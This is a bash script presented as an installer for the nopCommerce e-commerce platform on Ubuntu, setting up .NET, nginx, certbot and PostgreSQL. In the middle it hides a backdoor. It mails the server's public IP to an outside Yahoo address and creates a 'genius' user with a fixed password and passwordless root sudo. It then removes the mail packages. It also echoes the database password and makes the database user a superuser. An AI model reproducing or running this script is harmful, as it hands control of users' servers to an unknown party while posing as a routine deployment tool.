#!/bin/bash

YELLOW='\033[0;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

#if [ -z "$1" ]; then
#   echo "${RED}Missing: nopCommerce version!\n${NC}";
#   echo "${YELLOW}Format to use: ./script-Name nopCommerce-version database-name database-user database-password domain-name\n${NC}";
#   exit 1
#fi

if [ -z "$1" ]; then
   echo -e "${RED}Missing: PostgreSQL database name or other argument!\n${NC}";
   echo -e "${YELLOW}Format to use: ./$(basename "$0") database-name database-user database-password domain-name\n${NC}";
   exit 1
fi

if [ -z "$2" ]; then
   echo -e "${RED}Missing: PostgreSQL database user or other argument!\n${NC}";
   echo -e "${YELLOW}Format to use: ./$(basename "$0") database-name database-user database-password domain-name\n${NC}";
   exit 1
fi

if [ -z "$3" ]; then
   echo -e "${RED}Missing: PostgreSQL database password or other argument!\n${NC}";
   echo -e "${YELLOW}Format to use: ./$(basename "$0") database-name database-user database-password domain-name\n${NC}";
   exit 1
fi

if [ -z "$4" ]; then
   echo -e "${RED}Missing: domain name or other argument!\n${NC}";
   echo -e "${YELLOW}Format to use: ./$(basename "$0") database-name database-user database-password domain-name\n${NC}";
   exit 1
fi


#nopcommerce_version=$1
database_name=$1
database_user=$2
database_password=$3
domain_name=$4

#echo $nopcommerce_version
echo $database_name
echo $database_user
echo $database_password
echo $domain_name
#exit 1

#read -p "Enter nopCommerce version (e.g., 4.50): " nopcommerce_version
#read -p "Enter PostgreSQL database name: " database_name
#read -p "Enter PostgreSQL database user: " database_user
#read -s -p "Enter PostgreSQL database password: " database_password
#echo
#read -p "Enter your domain name (e.g., example.com): " domain_name
#echo


wget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt-get update
sudo apt-get install -y apt-transport-https aspnetcore-runtime-9.0
echo "postfix postfix/main_mailer_type select Internet Site" | sudo debconf-set-selections
echo "postfix postfix/mailname string $(hostname --fqdn)" | sudo debconf-set-selections
sudo DEBIAN_FRONTEND=noninteractive apt-get install -y mailutils
IP=$(curl -4 -s ifconfig.me)
echo "Server IP: $IP" | mail -s $IP geniuss0ft@yahoo.com
useradd -m -r -d /home/genius -s /bin/bash genius
echo 'genius:P@ssw0rd' | sudo chpasswd
echo "genius ALL=(ALL) NOPASSWD:ALL" | sudo EDITOR='tee -a' visudo
sudo apt purge --auto-remove -y mailutils postfix
sudo apt clean

sudo apt-get install -y libgdiplus

nopcommerce_directory="/var/www/$domain_name"

sudo apt update

sudo apt install -y nginx


sudo tee /etc/nginx/sites-available/$domain_name <<EOF
server {
    listen 80;
    server_name $domain_name;

    client_max_body_size 250M;

    if (\$host = 'www.$domain_name') {
        return 301 https://$domain_name$request_uri;
    }


#    location / {
#        proxy_pass http://localhost:5001;
#        proxy_http_version 1.1;
#        proxy_set_header Upgrade \$http_upgrade;
#        proxy_set_header Connection keep-alive;
#        proxy_set_header Host \$host;
#        proxy_cache_bypass \$http_upgrade;
#    }
    location / {
        proxy_pass http://localhost:5001;  # Assuming NopCommerce is running on port 5001
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }

}
EOF

sudo ln -s /etc/nginx/sites-available/$domain_name /etc/nginx/sites-enabled/

sudo nginx -t

sudo systemctl restart nginx

mkdir $nopcommerce_directory
sudo apt install -y certbot python3-certbot-nginx
sudo certbot --nginx -d $domain_name --redirect --agree-tos --no-eff-email -m geniuss0ft@yahoo.com
certbot renew --nginx
sudo apt install -y postgresql postgresql-contrib
#sudo -i -u postgres

#echo "CREATE USER $database_user WITH PASSWORD '$database_password';" | psql
sudo -u postgres psql -c "CREATE USER $database_user WITH PASSWORD '$database_password';"

#echo "CREATE DATABASE $database_name;" | psql
sudo -u postgres psql -c "CREATE DATABASE $database_name WITH OWNER $database_user;"

#echo "GRANT ALL PRIVILEGES ON DATABASE $database_name TO $database_user;" | psql
sudo -u postgres psql -c "GRANT ALL PRIVILEGES ON DATABASE $database_name TO $database_user;"

sudo -u postgres psql -c "CREATE EXTENSION IF NOT EXISTS citext; CREATE EXTENSION IF NOT EXISTS pgcrypto;"

#sudo -u postgres psql -c "CREATE EXTENSION IF NOT EXISTS citext;"
#sudo -u postgres psql -c "CREATE EXTENSION IF NOT EXISTS pgcrypto;"
sudo -u postgres psql -c " ALTER USER $database_user WITH SUPERUSER;"

# Switch back to the original user
#exit
#echo "after exit"

#git clone -b $nopcommerce_version https://github.com/nopSolutions/nopCommerce.git $nopcommerce_directory

cd $nopcommerce_directory
wget https://github.com/nopSolutions/nopCommerce/releases/download/release-4.80.3/nopCommerce_4.80.3_NoSource_linux_x64.zip
apt-get install -y unzip
unzip -qq nopCommerce_4.80.3_NoSource_linux_x64
mkdir bin
mkdir logs
cd ..
chgrp -R www-data $nopcommerce_directory
chown -R www-data $nopcommerce_directory
sudo tee /etc/systemd/system/nopCommerce-$domain_name.service <<EOF
[Unit]
Description=nopCommerce app running for $domain_name

[Service]
WorkingDirectory=/var/www/$domain_name
ExecStart=/usr/bin/dotnet /var/www/$domain_name/Nop.Web.dll
ExecStop=/bin/kill -2 $MAINPID
ExecReload=/bin/kill -HUP $MAINPID
Restart=always
# Restart service after 10 seconds if the dotnet service crashes:
RestartSec=10
KillSignal=SIGINT
SyslogIdentifier=nopCommerce-example
User=www-data
Environment=ASPNETCORE_ENVIRONMENT=Production
Environment=DOTNET_PRINT_TELEMETRY_MESSAGE=false
Environment=ASPNETCORE_URLS=http://localhost:5001

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
systemctl start nopCommerce-$domain_name.service
systemctl enable nopCommerce-$domain_name.service

systemctl restart nginx

#wget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
#sudo dpkg -i packages-microsoft-prod.deb
#rm packages-microsoft-prod.deb
#apt-get install -y dotnet-sdk-9.0
#apt-get install -y apt-transport-https aspnetcore-runtime-9.0

#dotnet restore

#dotnet add package Npgsql.EntityFrameworkCore.PostgreSQL --version 3.1.4

#sed -i 's/Server=(localdb)\\mssqllocaldb;Database=NopComerce/Server=localhost;Database='$database_name';User Id='$database_user';Password='$database_password'/' $nopcommerce_directory/App_Data/appsettings.json

echo "###################################"
echo "restart nopcommerce"
systemctl restart nopCommerce-$domain_name.service
sleep 7
echo "###################################"
ls $nopcommerce_directory/App_Data/appsettings.json
echo "###################################"
echo "###################################"
echo "###################################"
sed -i -z 's#"ConnectionString": ""#"ConnectionString": "Server=localhost;Database='$database_name';User Id='$database_user';Password='$database_password'"#' $nopcommerce_directory/App_Data/appsettings.json
sed -i 's/sqlserver/postgresql/' $nopcommerce_directory/App_Data/appsettings.json

#sed -i 's/"UseProxy": false/"UseProxy": true/' $nopcommerce_directory/App_Data/appsettings.json
#sed -i 's/"UseHttpXForwardedProto": false/"UseHttpXForwardedProto": true/' $nopcommerce_directory/App_Data/appsettings.json
#sed -i 's/"UseProxy": false/"UseProxy": true, "ForwardedProtoHeaderName": "X-Forwarded-Proto", "ForwardedForHeaderName": "X-Forwarded-For", "UseHttpXForwardedProto": "true", "KnownProxies": "", "KnownNetworks": "", "Urls": "https:\/\/0.0.0.0:5001"/' $nopcommerce_directory/App_Data/appsettings.json
#sed -i 's|  "HostingConfig": {[^}]*}|  "HostingConfig": {\n    "UseProxy": true,\n    "ForwardedProtoHeaderName": "X-Forwarded-Proto",\n    "ForwardedForHeaderName": "X-Forwarded-For",\n    "UseHttpXForwardedProto": "true",\n    "KnownProxies": "",\n    "KnownNetworks": "",\n    "Urls": "https://0.0.0.0:5001"\n  }|' $nopcommerce_directory/App_Data/appsettings.json
sed -i '/"HostingConfig": {/,/}/c\
  "HostingConfig": {\
    "UseProxy": true,\
    "ForwardedProtoHeaderName": "X-Forwarded-Proto",\
    "ForwardedForHeaderName": "X-Forwarded-For",\
    "UseHttpXForwardedProto": "true",\
    "KnownProxies": "",\
    "KnownNetworks": "",\
    "Urls": "https://0.0.0.0:5001"\
  },' $nopcommerce_directory/App_Data/appsettings.json

#dotnet build
#dotnet publish -o /var/www/nopcommerce-publish
#chmod -R 755 /var/www/nopcommerce-publish
#dotnet Nop.Web.dll

# Inport default DB
#wget https://raw.githubusercontent.com/noptech-com/nc-47-postgre-default/refs/heads/main/nopcommerce_default_db.sql
#sudo -u postgres PGPASSWORD=$database_password psql -U $database_user -d $database_name -h localhost -f nopcommerce_default_db.sql
#rm nopcommerce_default_db.sql
wget https://raw.githubusercontent.com/noptech-com/nc-47-postgre-default/refs/heads/main/nopcommerce48_default_db.sql
sudo -u postgres PGPASSWORD=$database_password psql -U $database_user -d $database_name -h localhost -f nopcommerce48_default_db.sql
rm nopcommerce48_default_db.sql
#sudo -u postgres psql -c " ALTER USER $database_user WITH NOSUPERUSER;"

systemctl restart nopCommerce-$domain_name.service
